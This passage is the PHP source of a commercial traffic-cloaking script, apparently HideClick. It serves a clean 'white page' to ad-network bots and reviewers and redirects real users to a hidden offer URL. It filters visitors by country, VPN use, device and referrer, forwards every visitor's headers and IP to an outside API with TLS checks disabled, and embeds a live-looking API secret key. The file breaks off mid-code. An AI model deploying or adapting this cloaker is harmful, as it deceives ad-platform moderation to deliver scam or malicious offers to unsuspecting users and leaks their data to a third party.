<?php
            /* Required settings     */
            $CLOAKING['WHITE_PAGE'] = 'indexi.php';//PHP/HTML file or URL used for bots
            $CLOAKING['OFFER_PAGE'] = 'https://blackteam11.club/Zm9N7Nb8';//PHP/HTML file or URL offer used for real users
            $CLOAKING['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
            $CLOAKING['STEALTH'] = 'on';// replace "on" with "off" to hide stat page
            /*********************************************/
            /* Available additional settings  */

            /* Geo filter: Display offer page only to visitors from allowed countries.  */
            /* For example, if you enter 'RU,UA' in the next line, system will only allow users from Russia and Ukraine */
            $CLOAKING['ALLOW_GEO'] = '‘CA,AU,NZ,SE,SG,JO,CN,KR,GB’';

            /* Blocked Geo filter: Hide offer page from visitors of selected countries.  */
            /* For example, if you enter 'IN,CN' in the next line, system will block users from India and China */
            //$CLOAKING['BLOCK_GEO'] = 'IN,CN';

            /* UTM parameters forwarding */
            /* true - turn on UTM forwarding; */
            /* false - disable UTM forwarding */
            $CLOAKING['UTM'] = true;

            /* OFFER_PAGE display method. Available options: meta, 302, iframe */
            /* 'meta' - Use meta refresh to redirect visitors. (default method due to maximum compatibility with different hostings) */
            /* '302' -  Redirect visitors using 302 header (best method if the goal is maximum transitions).*/
            /* 'iframe' - Open URL in iframe. (recommended and safest method. requires the use of a SSL to work properly) */
            $CLOAKING['OFFER_METHOD'] = 'meta';

            /* WHITE_PAGE display method. Available options: curl, 302 */
            /* 'curl' - uses a server request to display third-party whitepage on your domain */
            /* '302' -  uses a 302 redirect to redirect the request to a third-party domain (only for trusted accounts)  */
            $CLOAKING['WHITE_METHOD'] = 'curl';

            /* NO_REF used to block requests with empty referrer. */
            /* false - allow requests without referrer */
            /* true - block requests without referrer */
            $CLOAKING['NO_REF'] = false;

            /* WHITE_REF blocks requests if referrer does not match the regular expression.*/
            /* For example: 'google|facebook' will block all traffic, exept traffic from google and facebook */
            $CLOAKING['WHITE_REF'] = '';

            /* change 'false' to 'true' to block Apple devices (iOS, Mac) */
            $CLOAKING['BLOCK_APPLE'] = false;

            /* change 'false' to 'true' to block Android devices */
            $CLOAKING['BLOCK_ANDROID'] = false;

            /* change 'false' to 'true' to block Windows devices */
            $CLOAKING['BLOCK_WIN'] = false;

            /* change 'false' to 'true' to block mobile devices */
            $CLOAKING['BLOCK_MOBILE'] = false;

            /* change 'false' to 'true' to block desctop devices */
            $CLOAKING['BLOCK_DESCTOP'] = false;

            /* change 'false' to 'true' to allow requests from VPN/DataCenters/HostingServers/CloudNetworks */
            $CLOAKING['ALLOW_VPN'] = 'false';

            /* DELAY_START allows you to block the first X unique IP addresses. */
            $CLOAKING['DELAY_START'] = 0;

            /* DELAY_PERMANENT always show the whitepage for IP in the list of first X requests */
            $CLOAKING['DELAY_PERMANENT'] = false;

            /* Paranoia mode uses the most rigid filters. Checks out some additional features inherent in spy services. But at the same time, in some countries, it can block a significant part of real users. */
            /* change 'false' to 'true' to activate this mode */
            $CLOAKING['PARANOID'] = false;

            /* secret UTM options */
            // if allow_utm_must is set and the same UTM string is not present in the request, the white page will be displayed.
            // $CLOAKING['allow_utm_must']='utm_source=adwords';

            // if allow_utm_opt is set and NONE of the keys are present in the request, the white page will be displayed.
            // (keywords must be separated by commas)
            // $CLOAKING['allow_utm_opt']='poker,betting';

            // if block_utm is set, and the same UTM string is present in the request, the white page will be displayed.
            // $CLOAKING['block_utm']='utm_city=Paris';

            // Tip: you can use UTM key 'utm_allow_geo' in the request URL to overwrite ALLOW_GEO. For example: https://domain/?utm_allow_geo=FR will display the white page if the request is NOT from France.

            /* The next settings are needed only if your hosting isn't standart or something doesn't work */
            /* delete symbols "//" in the next line if service doesn't work or you use CDN, Varnish or other caching proxy */
            //$CLOAKING['DISABLE_CACHE'] = true;
            /*********************************************/
            /* You API key.                              */
            /* DO NOT SHARE API KEY! KEEP IT SECRET!     */
            $CLOAKING['API_SECRET_KEY'] = 'v1c9bfcc0140ce45cbbadcbef84969aedb';
            /*********************************************/
            // DO NOT EDIT ANYTHING BELOW !!!
            if(!empty($CLOAKING['VERSION']) || !empty($GLOBALS['CLOAKING']['VERSION'])) die('Recursion Error');
            //$CLOAKING['VERSION']=20200303;
            $CLOAKING['VERSION']=20210527;
            //$CLOAKING['HTACCESS_FIX'] = true;
            /* dirty fix!!! uncomment only if problem with IP detection!!! */
            //if(!empty($_SERVER['HTTP_X_REAL_IP'])) $_SERVER['REMOTE_ADDR']=$_SERVER['HTTP_X_REAL_IP'];

            $errorContactMessage="<br><br>Something went wrong. Contact support";
            if(!empty($_GET['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#',$_GET['utm_allow_geo'])) $CLOAKING['ALLOW_GEO']=$_GET['utm_allow_geo'];
            if(empty($CLOAKING['PARANOID'])) $CLOAKING['PARANOID']='';
            if(empty($CLOAKING['ALLOW_GEO'])) $CLOAKING['ALLOW_GEO']='';
            if(empty($CLOAKING['BLOCK_GEO'])) $CLOAKING['BLOCK_GEO']='';
            if(empty($CLOAKING['HTACCESS_FIX'])) $CLOAKING['HTACCESS_FIX']='';
            if(empty($CLOAKING['DISABLE_CACHE'])) $CLOAKING['DISABLE_CACHE']='';
            else {
                setcookie("euConsent", 'true');
                setcookie("BC_GDPR", time());
                header( "Cache-control: private, max-age=0, no-cache, no-store, must-revalidate, s-maxage=0" );
                header( "Pragma: no-cache" );
                header( "Expires: ".date('D, d M Y H:i:s',rand(1560500925,1571559523))." GMT");
            }

            if(!empty($_REQUEST['cloaking']) && ($CLOAKING['STEALTH']=='off' || $CLOAKING['DEBUG_MODE'] == 'on' || (!empty($_REQUEST['key']) && $_REQUEST['key']==$CLOAKING['API_SECRET_KEY'])) ) {
                ini_set('display_errors', 1);
                ini_set('display_startup_errors', 1);
                error_reporting(E_ALL);
                if ($_REQUEST['cloaking'] == 'stat' || $_REQUEST['cloaking'] == 'stats') {
                    if(empty($CLOAKING['API_SECRET_KEY'])||strlen($CLOAKING['API_SECRET_KEY'])<16) {
                        echo '<html><head><meta name="robots" content="noindex"><meta charset="UTF-8"></head><body><b>Error: secret API key is missing !</b><br>Put the API key (you can find it in the email) to line <b>#'.cloakedEditor("\$CLOAKING['API_SECRET_KEY']").'</b> so that it looks like:<br><code>$CLOAKING[\'API_SECRET_KEY\'] = \'put your API key here\';</code><br>'.$errorContactMessage;
                        die();
                    }
                    setcookie("hideclick", 'ignore', time()+604800);
                    if(!empty($_SERVER['HTTP_HOST'])) $host=$_SERVER['HTTP_HOST'];
                    else if(!empty($_SERVER['Host'])) $host=$_SERVER['Host'];
                    else if(!empty($_SERVER['host'])) $host=$_SERVER['host'];
                    else if(!empty($_SERVER[':authority'])) $host=$_SERVER[':authority'];
                    else $host='';
                    if(!empty($_SERVER['REQUEST_URI'])) $host.=$_SERVER['REQUEST_URI'];
                    if(stristr($host,'?')) $host=substr(0,strpos($host,'?'));
                    if(substr($host,0,4)=='www.') $host=substr($host,4);
                    $domainStat='';
                    if(!empty($_REQUEST['domain'])) $domainStat.='&domain='.$_REQUEST['domain'];
                    if(!empty($_REQUEST['date2'])) $domainStat.='&date2='.$_REQUEST['date2'];//timestamp
                    else $domainStat.='&date2='.time();
                    if(!empty($_REQUEST['date1'])) $domainStat.='&date1='.$_REQUEST['date1'];//timestamp
                    else $domainStat.='&date1='.(time()-604800);
                    if (!function_exists('curl_init')) $statistic = file_get_contents('https://hideapi.xyz/newstat?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=92194113106631f1629985810&version='.$CLOAKING['VERSION'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'] . '&host=' . urlencode($host) . '&white=' . urlencode($CLOAKING['WHITE_PAGE']) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat, 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 45), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,) )) );
                    else $statistic = cloakedCurl('https://hideapi.xyz/newstat?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=92194113106631f1629985810&version='.$CLOAKING['VERSION'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'] . '&host=' . urlencode($host) . '&white=' . urlencode($CLOAKING['WHITE_PAGE']) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']).$domainStat);
                    echo $statistic;
                    if (empty($statistic)) echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>".$errorContactMessage;
                }
                else if ($_REQUEST['cloaking'] == 'white') cloakedWhitePage($CLOAKING['WHITE_PAGE'],$CLOAKING['WHITE_METHOD']);
                else if ($_REQUEST['cloaking'] == 'offer') cloakedOfferPage($CLOAKING['OFFER_PAGE'],$CLOAKING['OFFER_METHOD']);
                else if ($_REQUEST['cloaking'] == 'debug') {phpinfo();print_r(debug_backtrace ());$CLOAKING['API_SECRET_KEY']=1;print_r($CLOAKING);die();}
                else if ($_REQUEST['cloaking'] == 'test') {
                    if (!function_exists('curl_init')) {
                        echo "<br>CURL not found<br>\n";
                        $http_response_header = array();
                        echo "HTTP domain";
                        $statistic = file_get_contents('http://api.hideapi.xyz/status', 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header' => "Content-type: application/x-www-form-urlencoded\r\n" . "Content-Length: 4\r\n", 'content' => 'ping'))));
                        print_r($http_response_header);
                        echo "<br>\n";
                        print_r($statistic);
                        echo "<hr>\n";
                        $http_response_header = array();
                        echo "HTTPS domain\n";
                        $statistic = file_get_contents('https://hideapi.xyz/status', 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header' => "Content-type: application/x-www-form-urlencoded\r\n" . "Content-Length: 4\r\n", 'content' => 'ping'))));
                        print_r($http_response_header);
                        echo "<br>\n";
                        print_r($statistic);
                        echo "<hr>\n";
                    }
                    else {
                        $body = 'ping';
                        echo "<br>using CURL<br>\n";
                        $ch = curl_init();
                        echo "HTTP domain";
                        curl_setopt($ch, CURLOPT_URL,'http://api.hideapi.xyz/status');
                        if(!empty($body)) {curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");}
                        if(!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
                        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        $r = @curl_exec($ch);
                        $info = curl_getinfo($ch);
                        print_r($info);
                        echo "<br>\n";
                        curl_close ($ch);
                        echo "$r<hr>\n";

                        $ch = curl_init();
                        echo "HTTPS domain";
                        curl_setopt($ch, CURLOPT_URL,'https://hideapi.xyz/status');
                        if(!empty($body)) {curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");}
                        if(!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
                        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        $r = @curl_exec($ch);
                        $info = curl_getinfo($ch);
                        print_r($info);
                        echo "<br>\n";
                        curl_close ($ch);
                        echo "$r<hr>\n";
                    }
                }
                else if ($_REQUEST['cloaking'] == 'time') {
                    header( "Cache-control: public, max-age=999999, s-maxage=999999" );
                    header( "Expires: Wed, 21 Oct 2025 07:28:00 GMT" );
                    echo str_replace(" ","",rand(1,10000).microtime().rand(1,100000));
                }
                die();
            }

            else if($CLOAKING['DEBUG_MODE'] == 'on'){
                set_time_limit(5);
                ini_set('max_execution_time',5);
                ini_set('display_errors', 1);
                ini_set('display_startup_errors', 1);
                error_reporting(E_ALL);
                $error=0;
                setcookie("hideclick", 'ignore', time()+604800);
                // don't use $_SERVER["REDIRECT_URL"], as there is servers that use it without redirect
                if(!empty($_GET) || !empty($_POST) || ($_SERVER["SCRIPT_NAME"]!=$_SERVER["REQUEST_URI"] && $_SERVER["REQUEST_URI"]!=str_replace("index.php","",$_SERVER["SCRIPT_NAME"]))) {
                    echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>Error with rewrite engine.<!--//'".$_SERVER["SCRIPT_NAME"]."'!='".$_SERVER["REQUEST_URI"]."'//-->".$errorContactMessage;
                    die();
                }
                echo '<html><head><meta name="robots" content="noindex"><meta charset="UTF-8"><style type="text/css">body, html {font-family: Calibri, Ebrima;}img {margin-left:2em;opacity: 0.25;}img:hover {opacity: 1.0;}</style></head><body><b>Congratulations.</b><br>Literally in a moment you can increase your ROI.<br><br><b>First, make sure that everything is configured correctly:</b><br>';
                if(is_file($CLOAKING['WHITE_PAGE'])) echo '✔ WHITE_PAGE - ok. <a target="_blank" href="?cloaking=white">Click here to check the WHITE_PAGE</a>.<br>';
                else if(strstr($CLOAKING['WHITE_PAGE'],'://')) echo '⚠ To reduce the likelihood of a ban, we recommend using local WHITE_PAGE (page located on your website)! If you still want to use the current settings, <a target="_blank" href="?cloaking=white">click here to check the WHITE_PAGE</a>.<br>';
                else {echo '❌ WHITE_PAGE - error! Change the value in line <b>#'.cloakedEditor("\$CLOAKING['WHITE_PAGE']").'</b> to the page that will be displayed to bots<br><img src="https://hide.click/gif/white.gif" border="1"><br>';$error=1;}

                if(is_file($CLOAKING['OFFER_PAGE']) && ($CLOAKING['OFFER_PAGE']=='index.htm' || $CLOAKING['OFFER_PAGE']=='index.html' || $CLOAKING['OFFER_PAGE']=='index.php' )) {echo '⚠ To reduce the likelihood of a ban, rename OFFER_PAGE (for example, <b>offer.php</b> instead of <b>'.$CLOAKING['OFFER_PAGE'].'</b>) and put new name in line <b>#'.cloakedEditor("\$CLOAKING['OFFER_PAGE']").'</b> <img src="https://hide.click/gif/black.gif" border="1"><br>';}
                else if(is_file($CLOAKING['OFFER_PAGE']) || strstr($CLOAKING['OFFER_PAGE'],'://')) echo '✔ OFFER_PAGE - ok. <a target="_blank" href="?cloaking=offer">Click to check the OFFER_PAGE</a>.<br>';
                else {echo '❌ OFFER_PAGE - error! Change the value in line <b>#'.cloakedEditor("\$CLOAKING['OFFER_PAGE']").'</b> to the page that will be displayed to targeted users<br><img src="https://hide.click/gif/black.gif" border="1"><br>';$error=1;}
                $CLOAKINGdata='{}';
                if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92194113106631f1629985810&version='.$CLOAKING['VERSION'].'&curl=false&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'] , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
                else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92194113106631f1629985810&version='.$CLOAKING['VERSION'].'&curl=true&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'], $CLOAKINGdata);

                if(!$CLOAKING['STATUS'] || stristr($CLOAKING['STATUS'],'error')){
                    echo '❌ PHP configuration error. Contact your hosting support and ask them to enable CURL in PHP.<br>';
                    $error=1;
                }
                if(stristr($CLOAKING['STATUS'],'payment')||stristr($CLOAKING['STATUS'],'expired')){
                    echo '❌ Your secret API key has expired or blocked due terms violation. Contact support to extend the service!<br>';
                    $error=1;
                }
                $CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);
                if(empty($CLOAKING['STATUS']) || empty($CLOAKING['STATUS']['action'])){
                    echo '❌ Network error. Your hosting provider might be using some kind of firewall or resource limiter that will result in excessive traffic loss. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
                    $error=1;
                }

                $CLOAKINGdata = array();
                if (function_exists("getallheaders")) $CLOAKINGdata = getallheaders();
                else foreach($_SERVER as $k=> $v){
                    if (substr($k, 0, 5) == 'HTTP_') $CLOAKINGdata[$k] = $v;
                }
                $CLOAKINGdata['path']=$_SERVER["REQUEST_URI"];
                $CLOAKINGdata['REQUEST_METHOD']=$_SERVER['REQUEST_METHOD'];
                if( $_SERVER["SERVER_PORT"]==443 || !empty($_SERVER['HTTPS']) || !empty($_SERVER['SSL']) ) $CLOAKINGdata['HTTP_HTTPS']='1';
                $CLOAKINGdata = json_encode($CLOAKINGdata);
                if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92194113106631f1629985810&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) .'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
                else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92194113106631f1629985810&version='.$CLOAKING['VERSION'].$CLOAKING['WHITE_METHOD'].'.'.$CLOAKING['OFFER_METHOD'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&blockgeo=' . urlencode($CLOAKING['BLOCK_GEO']) .'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
                $CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);
                if(empty($CLOAKING['STATUS']) || empty($CLOAKING['STATUS']['action'])){
                    echo '❌ Bad network! Your hosting provider might be using some kind of firewall or resource limiter that will result in excessive traffic loss. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
                    $error=1;
                }
                if($CLOAKING['STATUS']['action']!='allow') {
            //        echo '⚠ We do not recommend using VPN, anonymizers, privacy plugins or antidetect browsers during the setup process<br><br>';
                    echo '⚠ You may not see the offer if you are using VPN/proxy/developer_extensions/privacy_plugins/antidetect_browsers or other security tools during the setup process. Use standart browser and local/WiFi/mobile coonection to check offer page<br><br>';
                }

                // Needed to check if cache is using
                $testUrl= ( $_SERVER["SERVER_PORT"]==443 || (!empty($_SERVER['HTTP_CF_VISITOR']) && stristr($_SERVER['HTTP_CF_VISITOR'],'https')) || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO']=='https') || !empty($_SERVER['HTTPS'])  ) ? 'https://' : 'http://';
                // There's some bugs with CDN if using $_SERVER['HTTP_HOST'], so use $_SERVER["SERVER_NAME"] instead!
                $queryBug=strpos($_SERVER["REQUEST_URI"],'?');
                if(empty($_SERVER["SERVER_NAME"]) || $_SERVER["SERVER_NAME"] == '_' || $_SERVER["SERVER_NAME"] == 'localhost') $_SERVER["SERVER_NAME"] = $_SERVER["HTTP_HOST"];
                if($queryBug>0) $testUrl.=$_SERVER["SERVER_NAME"].substr($_SERVER["REQUEST_URI"],0,$queryBug).'?cloaking=time';
                else $testUrl.=$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"].'?cloaking=time';
                $http_response_header=array();
                $static1 = !function_exists('curl_init') ? file_get_contents($testUrl,'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,))) ) : cloakedCurl($testUrl);
                $static2 = !function_exists('curl_init') ? file_get_contents($testUrl,'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,))) ) : cloakedCurl($testUrl);
                $static3 = !function_exists('curl_init') ? implode("\n",$http_response_header) : cloakedCurl($testUrl,'',true);
                // Set-Cookie vs empty($CLOAKING['DISABLE_CACHE']) || !empty($CLOAKING['DISABLE_CACHE']) ???
                // x-cache-enabled: True
                // x-proxy-cache: HIT
                if(preg_match('#Proxy|Microcachable|X-Endurance-Cache-Level#i',$static3) || (empty($CLOAKING['DISABLE_CACHE']) && preg_match('#Set-Cookie#i', $static3) && !strstr($static3, '__cfduid=')) ){
                    echo '❌ Bad server configuration. Contact us. We will help.<br><br>';
                }
                else if($static1>0 && $static2>0 && $static1<=100000  && $static2<=100000 && $static1!=$static2) {}
                else if(empty($static1)||empty($static2)) {
                    echo "❌ Bad server configuration. Contact us. We will try to help.<!-- $static1 | $static2--><br><br>";
                    $error=1;
                }
                else if(empty($CLOAKING['DISABLE_CACHE'])) {
                    echo '❌ Bad server configuration. Remove <b>//</b> at the beginning of a line <b>#'.cloakedEditor("\$CLOAKING['DISABLE_CACHE']").'</b> to activate "DISABLE_CACHE" mode.<br><img src="https://hide.click/gif/cache.gif" border="1"><br><br>';
                    $error=1;
                }
                if(preg_match('#x-cache-enabled.*True#i',$static3)) {// || (!empty($_SERVER['X-LSCACHE']) &&  $_SERVER['X-LSCACHE']=='on')
                    echo '❌ Bad server. The current server caches the results, which will lead to large traffic losses and a high probability of being banned. It can\'t be fixed on our side. You need a different hosting. Contact us if you have any questions.<br><br>';
                    $error=1;
                }
            //    else if(!empty($CLOAKING['DISABLE_CACHE'])) {
            //        echo '❌ Bad server configuration. Ask hosting support to turn off caching (or move website to another hosting).<br><br>';
            //        $error=1;
            //    }
                if(preg_match('#[^A-Za-z ,]+#',$CLOAKING['ALLOW_GEO'])) {
                    echo '❌ Geo filter is not configured correctly. Only letters A-Z (2x country codes) and commas can be used at line <b>#'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b>.<br><img src="https://hide.click/gif/geo.gif" border="1"><br>';
                    $error=1;
                }
                if(preg_match('#[^A-Za-z ,]+#',$CLOAKING['BLOCK_GEO'])) {
                    echo '❌ Blocked Geo filter is not configured correctly. Only letters A-Z (2x country codes) and commas can be used at line <b>#'.cloakedEditor("\$CLOAKING['BLOCK_GEO']").'</b>.<br><img src="https://hide.click/gif/geo.gif" border="1"><br>';
                    $error=1;
                }
                if($CLOAKING['DELAY_START']) {
                    file_put_contents('dummyCounter.txt','');
                    if(!is_file('dummyCounter.txt')) {
                        echo '❌ In order DELAY_START filter to work you need to create a file <b>dummyCounter.txt</b> in the directory <b>'.getcwd().'</b>. Make sure that the file is writable.<br>';
                        $error = 1;
                    }
                    else if(!is_writable('dummyCounter.txt')){
                        echo '❌ Make sure that the <b>dummyCounter.txt</b> file located in <b>'.getcwd().'</b>  is writable.<br>';
                        $error = 1;
                    }
                }

                if($error) { echo "<br><b>Correct the errors and reload the page.</b><br><br>Do you need some help? Write to us in telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>";die(); }

                if(empty($CLOAKING['ALLOW_GEO'])) echo '✔ Geo filtering is turned off. Put the two-letters country codes of allowed countries at the line <b>#'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b>.<br><img src="https://hide.click/gif/geo.gif" border="1"><br>';
                else echo '✔ Geo filtering is turned on. All countries except '.$CLOAKING['ALLOW_GEO'].' will get white page. You can change two-letters country codes of allowed countries at the line #'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b><br><img src="https://hide.click/gif/geo.gif" border="1"><br>';
                echo '✔ <a target="_blank" href="?cloaking=stat">Click here to open the statistics page</a>. Bookmark it for future reference.<br><br>';

                if(!empty($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['SERVER_ADDR'])) {
                    if($_SERVER['REMOTE_ADDR']==$_SERVER['SERVER_ADDR'] && empty($_SERVER['HTTP_CF_RAY']) && empty($_SERVER['HTTP_X_REAL_IP']) && empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
                        echo '❌ looks like your server falsify the user\'s IP address. Probably you need a different hosting. Contact us if you have any questions.<br>';
                    }
                    else if(preg_match('#^[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+[a-fA-F0-9]+[:.]+#',$_SERVER['REMOTE_ADDR'],$cid) && empty($_SERVER['HTTP_CF_RAY']) && empty($_SERVER['HTTP_X_REAL_IP']) && empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
                        if(stristr('#'.$_SERVER['SERVER_ADDR'],'#'.$cid[0])) echo '❌ looks like your server falsify the user\'s IP address. You need a different hosting. Contact us if you have any questions.<br>';
                    }
                }
                if(empty($_SERVER['HTTP_CF_RAY']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_REAL_IP']) && !empty($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['SERVER_ADDR']) && $_SERVER['HTTP_X_FORWARDED_FOR']==$_SERVER['HTTP_X_REAL_IP'] && $_SERVER['HTTP_X_REAL_IP']!=$_SERVER['REMOTE_ADDR'] && $_SERVER['REMOTE_ADDR']!=$_SERVER['SERVER_ADDR']) {
                    echo '❌ It looks like your server falsify the user IP address. Contact us via telegram: <a href="tg://resolve?domain=HideClick">@HideClick</a> to make sure everything is working correctly.<br>';
                }
                echo 'Excellent. Setup completed.<br>In the future, you can use this file for any number of domains. There is no need to repeat this process on this hosting.<br><br>';
                echo '<b><u>Last step:</u></b><br>If everything works without errors, turn off the DEBUG_MODE by changing the value in line <b>#'.cloakedEditor("\$CLOAKING['DEBUG_MODE']").'</b> to <b>off</b>.<br><img src="https://hide.click/gif/debug.gif" border="1"><br>';
                echo 'After that, the script will start working in production mode and instead of this page you will see offer page or white page (depends on settings).<br><br>';
                echo '<b>Important!<br>WHITE_PAGE MUST COMPLETELY COMPLY WITH THE ADVERTISING NETWORK RULES!</b><br>Do you need more information on how to make the right white page? Contact us in telegram: <a href="tg://resolve?domain=HideClick">@HideClick</a>.';
                die();
            }
            else {

            }

            if(empty($CLOAKING['WHITE_PAGE']) || (!strstr($CLOAKING['WHITE_PAGE'],'://') && !is_file($CLOAKING['WHITE_PAGE']))){
                echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: ".$CLOAKING['WHITE_PAGE']."! \r\n<br>".$errorContactMessage;
                die();
            }
            if(empty($CLOAKING['OFFER_PAGE']) || (!strstr($CLOAKING['OFFER_PAGE'],'://') && !is_file($CLOAKING['OFFER_PAGE']))){
                echo "<html><head><meta name=\"robots\" content=\"noindex\"><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: ".$CLOAKING['OFFER_PAGE']."! \r\n<br>".$errorContactMessage;
                die();
            }
            // start of code
            // dirty hack for binome to hide PHP headers...
            if (function_exists('header_remove')) header_remove("X-Powered-By");
            if (function_exists('ini_set')) @ini_set('expose_php', 'off');
            // dirty hack to save CPU load and avoid death loops by ignoring some extensions...
            if(empty($CLOAKING['HTACCESS_FIX']) && preg_match('#\.(jpg|jpeg|css|gif|svg|ttf|woff|webm|ico|js)$#i',$_SERVER["REQUEST_URI"])){
                if(!stristr($CLOAKING['OFFER_PAGE'],'://')) cloakedOfferPage($CLOAKING['OFFER_PAGE'],$CLOAKING['OFFER_METHOD']);
                else cloakedWhitePage($CLOAKING['WHITE_PAGE'],$CLOAKING['WHITE_METHOD']);
            }
            // dirty hacks to protect from death loops
            if(sizeof(debug_backtrace ())>2) {
                echo "ERROR: INFINITE RECURSION";
                die();
            }
            $CLOAKINGdata = array();

            if (function_exists("getallheaders")) $CLOAKINGdata = getallheaders();
            else foreach($_SERVER as $k=> $v){
                if (substr($k, 0, 5) == 'HTTP_') $CLOAKINGdata[$k] = $v;
            }
            $CLOAKINGdata['path']=$_SERVER["REQUEST_URI"];
